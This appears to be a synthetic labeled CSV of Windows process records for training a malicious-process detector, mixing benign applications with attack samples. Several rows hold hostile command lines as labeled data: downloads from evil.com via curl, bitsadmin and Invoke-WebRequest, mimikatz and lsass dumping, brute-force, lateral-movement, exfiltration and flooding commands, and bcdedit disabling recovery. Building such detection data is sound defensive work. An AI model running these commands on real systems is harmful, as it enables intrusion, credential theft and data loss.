process_name,cmdline,cpu_usage,memory_usage,has_network,connections,is_system_user,label,source,severity
NisSrv.exe,NisSrv.exe,7.219117258038859,0.5177024482877162,0,1,0,normal,synthetic_normal,
WmiPrvSE.exe,WmiPrvSE.exe,14.456604574885091,3.7922070935204113,1,5,0,normal,synthetic_normal,
node.exe,node.exe,27.853068992701303,25.835629760672834,1,20,0,normal,synthetic_normal,
wslhost.exe,wslhost.exe,11.477088033844433,1.485509909404251,0,14,0,normal,synthetic_normal,
ssh.exe,ssh.exe,25.15597847744423,2.175932124928099,0,18,0,normal,synthetic_normal,
stress.exe,stress.exe --cpu 8 --io 4,84.93120286464637,21.697376288428302,1,895,0,ddos,ddos_tools,
SecurityHealthSystray.exe,SecurityHealthSystray.exe,29.563943568905636,1.2551787502962872,1,3,0,normal,synthetic_normal,
SearchIndexer.exe,SearchIndexer.exe,14.491037419182948,3.6512748659535212,0,19,0,normal,synthetic_normal,
nmap.exe,nmap.exe -p- --min-rate 1000,78.81423743092274,8.010939187483938,0,6,0,reconnaissance,mitre_network_scanning,medium
Code.exe,Code.exe,13.413908381415716,6.790615812761975,1,19,0,normal,synthetic_normal,
vbc.exe,vbc.exe,29.05850815976581,0.8737939674323563,0,2,0,normal,synthetic_normal,
SearchIndexer.exe,SearchIndexer.exe,31.731710083650924,8.21535001738712,0,18,0,normal,synthetic_normal,
wininit.exe,wininit.exe,7.972269905354491,3.8839225759053466,0,3,0,normal,synthetic_normal,
WhatsApp.exe,WhatsApp.exe,7.426480376326522,4.068577061949197,0,19,0,normal,synthetic_normal,
Registry,Registry,8.65386914434251,7.428451143024962,0,19,0,normal,synthetic_normal,
code.exe,code.exe,5.008271412794754,1.045225579082411,1,16,0,normal,synthetic_normal,
cscript.exe,cscript.exe //E:jscript payload.js,26.7067213508012,17.56179077122458,1,7,0,malware,mitre_malicious_scripts,medium
Slack.exe,Slack.exe,23.73974082722417,4.673980286880832,0,15,0,normal,synthetic_normal,
OneDrive.exe,OneDrive.exe,10.724923038238018,3.408491178877626,0,5,0,normal,synthetic_normal,
g++.exe,g++.exe,0.8027911614548711,3.753838191557275,0,20,0,normal,synthetic_normal,
explorer.exe,explorer.exe,27.886158562666786,3.4303398146959174,0,6,0,normal,synthetic_normal,
firefox.exe,firefox.exe,19.66862083173843,13.611256796408721,1,10,0,normal,synthetic_normal,
git-remote-https.exe,git-remote-https.exe,12.594893778920383,5.017794312128467,1,2,0,normal,synthetic_normal,
qbot.exe,qbot.exe --silent,57.4878046023635,13.32969835468121,1,21,0,malware,known_malware,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,47.60988212882044,12.778564291688133,1,351,0,brute_force,brute_force_tools,
stress.exe,stress.exe --cpu 8 --io 4,85.11822032203884,15.022056333660077,1,1965,0,ddos,ddos_tools,
blackcat.exe,blackcat.exe --silent,58.77030863606129,32.66242101023248,1,7,0,malware,known_malware,
SecurityHealthService.exe,SecurityHealthService.exe,6.535316470154148,5.184014380638085,0,7,0,normal,synthetic_normal,
dotnet.exe,dotnet.exe,10.949582899411192,4.9960273532364905,0,12,0,normal,synthetic_normal,
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",87.1960713381772,8.462122229159217,1,134,0,brute_force,brute_force_tools,
ConEmuC64.exe,ConEmuC64.exe,27.086953935951506,3.9276563138105036,1,16,0,normal,synthetic_normal,
powershell.exe,powershell.exe -ep bypass -file malware.ps1,73.93616817261605,23.111744181842596,0,3,0,malware,mitre_malicious_scripts,high
7zG.exe,7zG.exe,21.039481776558112,3.5424051552139346,0,10,0,normal,synthetic_normal,
curl.exe,curl.exe -o malware.exe http://evil.com/payload,72.69183824413089,18.274257709150284,1,2,0,malware,mitre_download_execute,medium
lsasss.exe,lsasss.exe --silent,73.81135214725437,38.70829770446811,1,17,0,trojan,known_malware,
devenv.exe,devenv.exe,0.7141938582749274,6.702345274060112,0,8,0,normal,synthetic_normal,
tcpview.exe,tcpview.exe,12.401080915890132,3.7663376689349914,0,13,0,normal,synthetic_normal,
stress.exe,stress.exe --cpu 8 --io 4,89.41812788135708,32.114204452092594,1,600,0,ddos,ddos_tools,
Slack.exe,Slack.exe,4.220473393861292,5.65440671165837,0,13,0,normal,synthetic_normal,
csrs.exe,csrs.exe --silent,81.54552898243081,36.82900478511024,1,10,0,trojan,known_malware,
mpc-hc64.exe,mpc-hc64.exe,1.1874168602484991,3.824455852061631,0,17,0,normal,synthetic_normal,
code.exe,code.exe,28.5911243557082,5.907034611442656,1,14,0,normal,synthetic_normal,
fish.exe,fish.exe,10.612515826344476,2.6920812264213807,0,18,0,normal,synthetic_normal,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,96.61613801012422,18.96815668032103,1,96,0,brute_force,brute_force_tools,
MpCmdRun.exe,MpCmdRun.exe,11.898662805016713,3.934307894730153,0,6,0,normal,synthetic_normal,
com.docker.proxy.exe,com.docker.proxy.exe,12.848252060395183,6.410192788087742,0,12,0,normal,synthetic_normal,
wslservice.exe,wslservice.exe,6.358981544349178,6.35643787168503,1,6,0,normal,synthetic_normal,
g++.exe,g++.exe,23.782946469227614,6.560537533675368,1,8,0,normal,synthetic_normal,
Docker Desktop.exe,Docker Desktop.exe,24.450962247245272,4.467341111432756,0,16,0,normal,synthetic_normal,
loic.exe,loic.exe --target 192.168.1.1 --port 80,99.04434456159984,26.49987813520469,1,1261,0,ddos,ddos_tools,
conhost.exe,conhost.exe,21.165788940411282,4.175303969443594,0,18,0,normal,synthetic_normal,
fontdrvhost.exe,fontdrvhost.exe,24.843126938314953,2.1023145192576926,0,13,0,normal,synthetic_normal,
minerd.exe,minerd.exe --silent,30.281675503134778,38.88439791167174,1,6,0,ddos,known_malware,
patator.exe,patator.exe ssh_login host=target user=admin password=FILE0,89.44996530769791,10.26761242261424,1,331,0,brute_force,brute_force_tools,
tcpview.exe,tcpview.exe,17.068773817083038,4.4986241134717755,0,11,0,normal,synthetic_normal,
npm.exe,npm.exe,20.816284700063015,7.173153903400443,1,14,0,normal,synthetic_normal,
loic.exe,loic.exe --target 192.168.1.1 --port 80,98.12417320541981,39.96667858611183,1,1940,0,ddos,ddos_tools,
ctfmon.exe,ctfmon.exe,22.599305424802598,5.621806813471264,1,6,0,normal,synthetic_normal,
gcc.exe,gcc.exe,27.056710058674156,3.4641010212889407,1,0,0,normal,synthetic_normal,
quasarrat.exe,quasarrat.exe --silent,62.74868774941981,25.376616695956947,1,1,0,trojan,known_malware,
vivaldi.exe,vivaldi.exe,0.018164675588913104,6.980875939013742,0,11,0,normal,synthetic_normal,
firefox_update.exe,firefox_update.exe --silent,31.9671694970768,32.364162783951784,1,1,0,malware,known_malware,
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,85.80328716633149,11.030790530086716,1,826,0,ddos,ddos_tools,
devenv.exe,devenv.exe,11.022479000529087,1.8993775970597038,0,2,0,normal,synthetic_normal,
GoogleDriveSync.exe,GoogleDriveSync.exe,10.038419900813153,2.0276979032192495,0,19,0,normal,synthetic_normal,
Signal.exe,Signal.exe,18.019503713072012,3.6593657710986887,0,17,0,normal,synthetic_normal,
rustc.exe,rustc.exe,10.840098361286644,5.665909942734072,0,14,0,normal,synthetic_normal,
svchost32.exe,svchost32.exe --silent,63.20324057046842,36.16981972763761,1,4,0,malware,known_malware,
Skype.exe,Skype.exe,28.633938204695323,6.769217040360721,1,6,0,normal,synthetic_normal,
babuk.exe,babuk.exe --silent,47.190603582830946,34.36722844593584,1,30,0,malware,known_malware,
dotnet.exe,dotnet.exe,6.104301222472419,4.877916096400423,0,18,0,normal,synthetic_normal,
Registry,Registry,25.197573600398705,6.756384775028825,0,13,0,normal,synthetic_normal,
rubeus.exe,rubeus.exe asreproast,78.06197939543387,19.981359693893104,0,6,0,reconnaissance,mitre_reconnaissance,critical
wininit.exe,wininit.exe,2.5448758728146057,6.853017136610985,0,15,0,normal,synthetic_normal,
npm.exe,npm.exe,14.994299910399313,4.360084445993092,0,11,0,normal,synthetic_normal,
patator.exe,patator.exe ssh_login host=target user=admin password=FILE0,41.51933667574389,19.692953390689503,1,493,0,brute_force,brute_force_tools,
csrss.exe,csrss.exe,14.252405598161776,5.370334058090954,1,8,0,normal,synthetic_normal,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,51.477006519613425,10.972741886020366,1,406,0,brute_force,brute_force_tools,
csc.exe,csc.exe,7.027525051574431,7.37695662339523,1,18,0,normal,synthetic_normal,
cpuminer.exe,cpuminer.exe --silent,42.355029395872606,30.462193087945924,1,16,0,ddos,known_malware,
redis-server.exe,redis-server.exe,3.5129196963590625,5.940263169745902,1,13,0,normal,synthetic_normal,
POWERPNT.EXE,POWERPNT.EXE,23.750191995692763,6.805027801831565,1,16,0,normal,synthetic_normal,
pnpm.exe,pnpm.exe,0.18930773630340902,3.359747157919335,1,9,0,normal,synthetic_normal,
Signal.exe,Signal.exe,29.039484950914673,1.3678620840620586,0,1,0,normal,synthetic_normal,
Code.exe,Code.exe,7.068739618135854,0.5429853062412539,0,17,0,normal,synthetic_normal,
javaw.exe,javaw.exe,20.122602544883364,4.102634240749363,0,8,0,normal,synthetic_normal,
OUTLOOK.EXE,OUTLOOK.EXE,18.01723023053863,7.451285883532316,1,6,0,normal,synthetic_normal,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,87.45932421034162,8.179040555904805,1,62,0,brute_force,brute_force_tools,
Slack.exe,Slack.exe,19.900258175519657,3.06122288533096,0,10,0,normal,synthetic_normal,
7z.exe,7z.exe a -ppassword archive.7z C:\Confidential,70.38725153504271,21.51267089032138,1,8,0,data_exfiltration,mitre_data_exfiltration,medium
evil-winrm.rb,evil-winrm -i target -u user -p pass,32.84054565425593,6.539564251413275,1,1,0,lateral_movement,mitre_lateral_movement,critical
bloodhound.exe,bloodhound.exe -c All,74.13950400970128,12.033356388152336,0,10,0,reconnaissance,mitre_reconnaissance,critical
Dropbox.exe,Dropbox.exe,17.41818200288235,4.003125967633379,0,1,0,normal,synthetic_normal,
WINWORD.EXE,WINWORD.EXE,29.024270316220914,7.39977423780665,0,2,0,normal,synthetic_normal,
pnpm.exe,pnpm.exe,12.93779240716732,3.5936405342707545,0,12,0,normal,synthetic_normal,
SearchApp.exe,SearchApp.exe,2.355623573501109,3.293127648657418,0,19,0,normal,synthetic_normal,
winrm.cmd,winrs -r:target cmd,42.44666373327409,17.55540784494515,1,8,0,lateral_movement,mitre_lateral_movement,medium
cmake.exe,cmake.exe,5.419198548908231,3.0748281330902905,1,19,0,normal,synthetic_normal,
SearchIndexer.exe,SearchIndexer.exe,23.98417603223897,9.831766508232718,0,19,0,normal,synthetic_normal,
rustup.exe,rustup.exe,1.4695889694581021,7.849820141363317,1,18,0,normal,synthetic_normal,
sublime_text.exe,sublime_text.exe,7.103996180214326,1.7251590807226107,0,7,0,normal,synthetic_normal,
ZoomIt.exe,ZoomIt.exe,1.800691968012148,3.1595052444621805,0,18,0,normal,synthetic_normal,
Spotify.exe,Spotify.exe,23.039186889575856,3.5042459741274783,0,9,0,normal,synthetic_normal,
msedge.exe,msedge.exe,24.686802562460894,14.860144982308912,1,6,0,normal,synthetic_normal,
brave.exe,brave.exe,2.0903864705895003,4.0962606492335,1,7,0,normal,synthetic_normal,
lockbit.exe,lockbit.exe --silent,81.61396780501691,14.583693770828857,1,29,0,ransomware,known_malware,
printspoofer.exe,printspoofer.exe -i -c cmd,55.86459471835758,24.868311638325082,0,7,0,privilege_escalation,mitre_privilege_escalation,critical
spoolsv.exe,spoolsv.exe,24.314463169073402,2.108797831904883,0,8,0,normal,synthetic_normal,
python3.12.exe,python3.12.exe,27.270119165822024,1.828317484212008,0,11,0,normal,synthetic_normal,
bcdedit.exe,bcdedit.exe /set {default} recoveryenabled no,55.49562781385976,9.494665399835638,1,3,0,ransomware,mitre_ransomware,high
notpetya.exe,notpetya.exe --silent,87.30773489173862,22.35325321192974,1,25,0,malware,known_malware,
hoic.exe,hoic.exe,88.5723259224275,24.86364900451798,1,805,0,ddos,ddos_tools,
wslhost.exe,wslhost.exe,8.745308185490098,1.060820560109919,1,5,0,normal,synthetic_normal,
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,92.27548512237124,27.845715623116092,1,1127,0,ddos,ddos_tools,
wmplayer.exe,wmplayer.exe,11.446951603715002,7.768069664381999,0,4,0,normal,synthetic_normal,
ninja.exe,ninja.exe,6.6563978398002295,3.3365554361159826,0,9,0,normal,synthetic_normal,
RuntimeBroker.exe,RuntimeBroker.exe,13.394213893029818,0.9753350281565899,1,18,0,normal,synthetic_normal,
OUTLOOK.EXE,OUTLOOK.EXE,28.836562833810998,5.93632370080963,1,9,0,normal,synthetic_normal,
wmplayer.exe,wmplayer.exe,19.83413726259983,2.3975065910038986,0,4,0,normal,synthetic_normal,
goland64.exe,goland64.exe,28.297463897701082,7.456122088533789,0,16,0,normal,synthetic_normal,
rclone.exe,rclone.exe sync C:\Users\Documents mega:backup,73.95057354984954,5.131462953658888,1,4,0,data_exfiltration,mitre_data_exfiltration,high
loic.exe,loic.exe --target 192.168.1.1 --port 80,80.53716507018915,27.721493840510483,1,709,0,ddos,ddos_tools,
rustc.exe,rustc.exe,26.868428196986407,7.139049467349399,1,12,0,normal,synthetic_normal,
explorer.exe,explorer.exe,9.639150670580227,4.447209180020413,1,5,0,normal,synthetic_normal,
vite.exe,vite.exe,21.468718979589635,0.7573861719957427,0,8,0,normal,synthetic_normal,
Docker Desktop.exe,Docker Desktop.exe,21.615358840913085,4.33647065010324,0,10,0,normal,synthetic_normal,
powershell.exe,powershell.exe,7.277853784835808,3.453158574686619,1,5,0,normal,synthetic_normal,
Docker Desktop.exe,Docker Desktop.exe,26.678629899547577,5.0321301386475366,0,10,0,normal,synthetic_normal,
ONENOTE.EXE,ONENOTE.EXE,20.55197892255847,2.3625609322063426,1,8,0,normal,synthetic_normal,
esbuild.exe,esbuild.exe,22.65707720547049,4.438243443741296,1,6,0,normal,synthetic_normal,
procdump64.exe,procdump64.exe -accepteula -ma lsass.exe,64.00195075501438,22.743710692313147,1,9,0,credential_dumping,mitre_credential_dumping,critical
ZoomIt.exe,ZoomIt.exe,3.032042380600285,6.2496026277794225,0,3,0,normal,synthetic_normal,
mimikatz.exe,mimikatz.exe lsadump::dcsync,58.62251737951052,13.321084389587503,1,7,0,credential_dumping,mitre_credential_dumping,critical
loic.exe,loic.exe --target 192.168.1.1 --port 80,94.69882901671325,11.400061270468754,1,1563,0,ddos,ddos_tools,
blackmatter.exe,blackmatter.exe --silent,42.665724309296365,27.966877742501556,1,16,0,malware,known_malware,
pwsh.exe,pwsh.exe,21.95554788104603,3.6919196455016996,0,13,0,normal,synthetic_normal,
stress.exe,stress.exe --cpu 8 --io 4,84.25325314940251,36.52271558946852,1,1389,0,ddos,ddos_tools,
SyncThing.exe,SyncThing.exe,23.66016742188239,6.614862977064021,0,4,0,normal,synthetic_normal,
Illustrator.exe,Illustrator.exe,29.569097518176253,5.885649336049899,0,12,0,normal,synthetic_normal,
nmap.exe,nmap.exe -p- --min-rate 1000,74.58079339605786,22.609023643514025,1,48,0,reconnaissance,mitre_network_scanning,medium
mimikatz.exe,mimikatz.exe lsadump::sam,21.867140036851623,22.83735801377032,1,7,0,credential_dumping,mitre_credential_dumping,critical
clion64.exe,clion64.exe,2.945201106926334,2.9565462886547267,1,12,0,normal,synthetic_normal,
bcdedit.exe,bcdedit.exe /set {default} recoveryenabled no,78.16226983713013,7.930291944206322,0,1,0,ransomware,mitre_ransomware,high
locker.exe,locker.exe --wallet bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh,69.85694938127821,17.07268423012343,0,5,0,ransomware,mitre_ransomware,critical
ctfmon.exe,ctfmon.exe,20.22737502324314,2.9110400415851827,1,1,0,normal,synthetic_normal,
SearchApp.exe,SearchApp.exe,14.464976878838486,1.4880318604873661,0,0,0,normal,synthetic_normal,
iexplore.exe,iexplore.exe,25.572565534212835,7.858886371031091,0,20,0,normal,synthetic_normal,
advanced_port_scanner.exe,advanced_port_scanner.exe,49.35478327012342,20.048490303932162,0,28,0,reconnaissance,mitre_network_scanning,low
winrm.cmd,winrs -r:target cmd,50.33933525633659,17.840444312435803,1,1,0,lateral_movement,mitre_lateral_movement,medium
webshell.exe,webshell.exe --silent,92.68894499283115,20.731969267225537,1,28,0,malware,known_malware,
bitsadmin.exe,bitsadmin.exe /transfer job /download http://evil.com/mal.exe,74.02401053237173,20.92351063177452,0,0,0,malware,mitre_download_execute,high
SecurityHealthSystray.exe,SecurityHealthSystray.exe,9.023859642178234,3.2184155615693593,0,0,0,normal,synthetic_normal,
conhost.exe,conhost.exe,28.293144560703468,5.034844838941294,0,11,0,normal,synthetic_normal,
conhost.exe,conhost.exe,22.25327876498679,0.8190860018193584,0,12,0,normal,synthetic_normal,
esbuild.exe,esbuild.exe,13.316139292164289,1.9079101783513943,0,15,0,normal,synthetic_normal,
SenseIR.exe,SenseIR.exe,5.857443771041865,7.980992622089555,1,17,0,normal,synthetic_normal,
hping3.exe,hping3.exe --flood -p 80 target.com,88.80296583883141,11.59148331123698,1,983,0,ddos,ddos_tools,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,76.96288607983229,17.21610678327881,1,62,0,brute_force,brute_force_tools,
WmiPrvSE.exe,WmiPrvSE.exe,14.677468566249637,1.74552523103575,0,11,0,normal,synthetic_normal,
nmap.exe,nmap.exe -p- --min-rate 1000,50.36854897071764,18.172524085432144,0,41,0,reconnaissance,mitre_network_scanning,medium
Invoke-WebRequest,powershell.exe Invoke-WebRequest -Uri http://evil.com -OutFile mal.exe,61.6220102008783,17.84197662049492,0,3,0,malware,mitre_download_execute,medium
phoenixminer.exe,phoenixminer.exe --silent,66.74902985752256,24.79533232338229,1,19,0,ddos,known_malware,
python3.12.exe,python3.12.exe,3.586214177563669,1.1613858358371714,1,10,0,normal,synthetic_normal,
hoic.exe,hoic.exe,85.76753934348203,30.993335769288343,1,212,0,ddos,ddos_tools,
services.exe,services.exe,2.672034583573484,4.688147814584584,0,2,0,normal,synthetic_normal,
atom.exe,atom.exe,26.058756715672263,2.973471024291758,0,11,0,normal,synthetic_normal,
Blender.exe,Blender.exe,3.685104601030141,1.634283980028421,0,1,0,normal,synthetic_normal,
loic.exe,loic.exe --target 192.168.1.1 --port 80,88.38747009721364,39.703932165153,1,925,0,ddos,ddos_tools,
tcpview.exe,tcpview.exe,29.14098424303248,3.3514135944771772,0,15,0,normal,synthetic_normal,
git.exe,git.exe,5.961024036256531,4.292770069334583,1,2,0,normal,synthetic_normal,
wsl.exe,wsl.exe,5.012983792012492,2.675204445167507,0,1,0,normal,synthetic_normal,
SearchIndexer.exe,SearchIndexer.exe,21.18306732636558,7.8346990118864355,0,0,0,normal,synthetic_normal,
python3.11.exe,python3.11.exe,13.647013267663267,1.1649905388749482,1,16,0,normal,synthetic_normal,
python3.12.exe,python3.12.exe,27.635354072696177,4.902069322731509,0,2,0,normal,synthetic_normal,
wmplayer.exe,wmplayer.exe,22.487515818097766,7.02330707952154,1,8,0,normal,synthetic_normal,
redis-server.exe,redis-server.exe,11.522016475438644,5.437365102567221,0,12,0,normal,synthetic_normal,
ONENOTE.EXE,ONENOTE.EXE,3.8907512858128124,2.2786186871380005,1,6,0,normal,synthetic_normal,
Illustrator.exe,Illustrator.exe,27.300266883529613,2.907295284864232,1,17,0,normal,synthetic_normal,
AfterFX.exe,AfterFX.exe,6.280492234173706,4.072513995280958,0,20,0,normal,synthetic_normal,
dockerd.exe,dockerd.exe,13.216268963012105,7.532837811366557,0,0,0,normal,synthetic_normal,
vivaldi.exe,vivaldi.exe,11.561448699668649,6.314972941561142,1,15,0,normal,synthetic_normal,
sqlservr.exe,sqlservr.exe,28.252750623260216,7.286404923610884,0,3,0,normal,synthetic_normal,
java.exe,java.exe,43.36793495473593,19.98728651128801,1,18,0,normal,synthetic_normal,
com.docker.backend.exe,com.docker.backend.exe,12.82913613614734,0.6210114157794775,1,15,0,normal,synthetic_normal,
